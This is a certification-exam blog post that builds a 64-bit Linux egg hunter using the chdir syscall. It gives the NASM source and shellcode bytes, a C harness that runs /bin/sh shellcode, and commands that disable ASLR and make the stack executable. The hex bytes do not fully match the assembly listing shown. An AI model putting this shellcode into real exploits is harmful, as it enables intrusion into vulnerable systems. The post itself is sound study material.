Title: SLAE64 - Assignment 3
Date: 2022-06-25T08:51:58.000Z


## Disclaimer


This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

[https://www.pentesteracademy.com/course?id=7](https://www.pentesteracademy.com/course?id=7)

Student ID: PA-30398

## Source Code

The files for this assignment are:

- [egghunter.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/3/egghunter.nasm), the NASM file containing the assembly code for the egg hunter
- [test_egghunter.c](https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/3/test_egghunter.c), the C program for testing the egg hunter shellcode
- [test_egghunter_specific_address.c](https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/3/test_egghunter_specific_address.c), a modified version of the C program, in which the shellcode starts from a specific address to speed up the process

## Theory

Now comes the question: what is an `Egg Hunter`?

According to a paper titled `[Egg Hunter - A twist in Buffer Overflow](https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf) `published by Ashfaq Ansari on `Exploit-DB`:

<blockquote>The Egg hunting technique is used when there are not enough available consecutive memory locations to insert the shellcode. Instead, a unique "tag" is prefixed with shellcode.</blockquote><blockquote>When the "Egg hunter" shellcode is executed, it searches for the unique "tag" that was prefixed with the large payload and starts the execution of the payload.</blockquote>
## Practice

### Design Choices

To implement an egg-hunter for x64 Linux systems, I'm referring to the [same whitepaper](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) I used for the previous SLAE32 exam. It shows some techniques you can employ in your own implementation.

Since the `SIGSEGV handler technique` is considered `infeasible `mainly due to its size, I decided to use instead the `system call technique.`

As the name implies, it's based on the usage of system calls to scan the memory of the process in search of the so-called `egg`.

Given the fact that size is very important in egg-hunter shellcodes, we would need syscalls that do not require complex data structures. The best case is a `idempotent `syscall that accepts a single pointer argument.

For this reason, I performed some **grep **searches on the man pages installed on my system, and I discovered a few matches:

```bash
# Requirements:
- sudo apt install manpages-dev
- sudo find /usr/share/man2/ -type f -name "*.gz" -exec sh -c "gunzip {}" \;
- cd /usr/share/man2

grep -RiE '\(const char\s*?\*"\s[a-zA-Z]*\s*\)'

# chroot.2:.BI "int chroot(const char *" path );
# unlink.2:.BI "int unlink(const char *" pathname );
# delete_module.2:.BI "   int delete_module(const char *" name );
# umount.2:.BI "int umount(const char *" target );
# rmdir.2:.BI "int rmdir(const char *" pathname );
# acct.2:.BI "int acct(const char *" filename );
# chdir.2:.BI "int chdir(const char *" path );
# swapon.2:.BI "int swapoff(const char *" path );
# uselib.2:.BI "int uselib(const char *" library );
```

<figcaption class="figure-caption">Findings syscalls accepting one pointer argument</figcaption>

Theoretically, all of them should allow me to test whether a given memory address is valid.

However, I chose to use the syscall `chdir`, since it wouldn't cause too many changes to the program as compared to `unlink` and `rmdir` which seem far more dangerous.

Follows the function prototype of the syscall `chdir`:

```cpp
#include <unistd.h>

int chdir(const char *path);
```

<figcaption class="figure-caption">Function prototype of the syscall `chdir`</figcaption>

As you can see, it accept a single pointer argument.

All it does is try to change the `Current Working Directory` (`CWD`) to the path the argument `path` points to.

Since it accepts a pointer, we can use it to test memory addresses. 

Moreover, given that it already implements a `SIGSEGV handler`, the syscall won't throw a `SIGSEGV` error and crash the program.

Instead, it will return the error `EFAULT` (`0xfffffff2`), indicating that a bad address was passed as the argument of the syscall.

### Assembly Code

Follows my implementation in Assembly language:

```nasm
; Author: Robert Catalin Raducioiu

global _start

section .text

_start:

    ; start searching for the egg from the address 0x0
    xor edi, edi

NextPage:

    ; go to the next memory page (each one is 0x1000 bytes)
    or di, 0xfff
    
    ; go to the next memory address
    inc rdi

CheckAddress:

    ; call the syscall 80 (chdir)
    xor eax, eax
    mov al, 80
    syscall

    ; check if the last byte of RAX is equal to the last byte
    ; of the error EFAULT (0xfffffff2)
    cmp al, 0xf2
    jz NextPage

    ; set EAX to the egg
    mov eax, 0x74636273
    dec eax

    ; compare the egg with the bytes pointed to by RDI
    ; also increase RDI by 4
    scasd

    ; if it is not the egg, then go back and check the next address
    jnz CheckAddress

    ; jump at the beginning of the actual shellcode
    call rdi
```

<figcaption class="figure-caption">Egg Hunter Shellcode</figcaption>

Note that the `CheckBytes` routine does not contain an exact copy of the egg, however it's slightly modified, in this case the last byte is increased by `0x1`.

Therefore, in order to calculate the real egg, it uses the assembly instruction `DEC` to decrease the value of the modified egg.

This was done to avoid another exact occurrence of the egg, which could lead to the egg hunter finding the latter instead of the egg prepended to the shellcode.

To obtain the shellcode from the previous assembly program, you can use these instructions:

```bash
nasm -f elf64 egghunter.nasm
objcopy -O binary -j .text egghunter.o /dev/stdout | od -An -t x1  | tr -d '\n' | sed -r 's/^ |$/"/g;s/\s?([0-9a-f]{2})/\\x\1/g'

# Result:
# "\x31\xff\x48\xf7\xe7\x66\x81\xcf\xff\x0f\x48\xff\xc7\x31\xc0\xb0\x50\x0f\x05\x3c\xf2\x74\xee\x8b\x17\xbe\x73\x62\x63\x74\xff\xce\x39\xf2\x75\xe6\x48\x83\xc7\x04\xff\xd7"
```

<figcaption class="figure-caption">Egghunter shellcode</figcaption>

### Testing

During my tests, I noticed that a long period of time was required for the egg hunter to find the egg and execute the real shellcode. This is caused by the usage of 64-bits memory addresses.

In fact, while most of the x86 systems have 32 bits for virtual addresses, x86-64 systems have 48 bits.

<table>
<thead>
<tr>
<th>System</th>
<th>Number of memory pages</th>
</tr>
</thead>
<tbody>
<tr>
<td>x86</td>
<td>2^32 / 0x1000 = 1.048.576</td>
</tr>
<tr>
<td>x86-64</td>
<td>2^48 / 0x1000 = 68.719.476.736</td>
</tr>
</tbody>
</table>

From the table above, we can see that it takes 68.000 more times to scan all the virtual addresses in a x86-64 process.

Time-wise, to find an egg in a 64-bit process I would have to wait more than 10 hours, while it would take some seconds/minutes in 32-bit processes.

For testing purposes, I chose to speed up the process by starting from an address closer to the location of the real shellcode.

To do this, first I had to disable **ASRL **(`Address Space Layout Randomization`) on my Linux host:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# to enable it again:
# echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

<figcaption class="figure-caption">Disabling ASLR on Linux</figcaption>

After that, I wrote a simple C program to test the egghunter shellcode:

```cpp
#include <stdio.h>
#include <string.h>

#define EGG "\x72\x62\x63\x74"

void main(int argc, char* argv[])
{
    /*
    Shellcode for spawning /bin/sh, with the egg prepended
    */
    unsigned char shellcode[] = EGG "\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x83\xc0\x3b\x0f\x05";

    unsigned char egghunter[] = "\x31\xff\x48\xf7\xe7\x66\x81\xcf\xff\x0f\x48\xff\xc7\x31\xc0\xb0\x50\x0f\x05\x3c\xf2\x74\xee\x8b\x17\xbe\x73\x62\x63\x74\xff\xce\x39\xf2\x75\xe6\x48\x83\xc7\x04\xff\xd7";

    printf("[+] Shellcode length: %d\n", strlen(shellcode));
    printf("[+] Egg-hunter length: %d\n", strlen(egghunter));

    int (*ret)() = (int(*)())egghunter;
    ret();
}
```

<figcaption class="figure-caption">Program for testing the egghunter</figcaption>

Next, I compiled it with gcc:

```bash
gcc -w -o test_egghunter -zexecstack ./test_egghunter.c
```

<figcaption class="figure-caption">Compiling the testing program</figcaption>

As previously assumed, once I ran the program, it didn't spawn a shell, but it would require many hours of time.

Since the real shellcode is stored on the stack (hence a local variable within the main function), I decided to retrieve the starting address of the stack and increase the `RDI` register of the egghunter shellcode by this value. 

Doing so, the testing program would be able to find the egg, and execute the real shellcode in a matter of seconds.

First things first, to retrieve the starting address of the stack I ran the commands below while the testing program was still running:

```bash
# get the PID of the testing program
ps aux | grep test_egghunter
# kali       21105 98.6  0.0   2424   680 pts/1    R+   05:47   0:38 ./test_egghunter

# get the base address of the stack
cat /proc/21105/maps
# 7ffffffde000-7ffffffff000 rwxp 00000000 00:00 0            [stack]
```

<figcaption class="figure-caption">Retrieving the base address of the stack from the running program</figcaption>

After that, I added the following line to the NASM program:

```diff
--- egghunter.nasm	2022-06-26 08:42:28.986705942 -0400
+++ egghunter_fast.nasm	2022-06-26 08:42:35.690706235 -0400
@@ -8,6 +8,7 @@
 
     ; start searching for the egg from the address 0x0
     xor edi, edi
+    mov rdi, 0x7fffffff0000
 
 NextPage:
```

<figcaption class="figure-caption">Speeding up the egghunter shellcode</figcaption>

Running again the testing program with the new egghunter shellcode, the latter successfully found the egg, and passed the execution to the real shellcode, which spawned a simple `/bin/sh` shell.

The following figure demonstrates the result: 

<figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/07/image-2.png" class="kg-image" alt loading="lazy" width="1477" height="483" srcset="__GHOST_URL__/content/images/size/w600/2022/07/image-2.png 600w, __GHOST_URL__/content/images/size/w1000/2022/07/image-2.png 1000w, __GHOST_URL__/content/images/2022/07/image-2.png 1477w" sizes="(min-width: 720px) 720px"><figcaption class="figure-caption">Successful execution of the shellcode</figcaption>

Note that in this case the length of the egg hunter shellcode is wrong due to the function `strlen` not being able to calculate the length of the shellcode, as the latter contains some `NULL` bytes.

**Without** the last modification (`mov rdi, 0x7fffffff0000`), the actual length of the egg hunter shellcode is **32 bytes**.

Please refer to the paragraph `Source Code` if you want to C code with the egg hunter shellcode starting from a specific address.

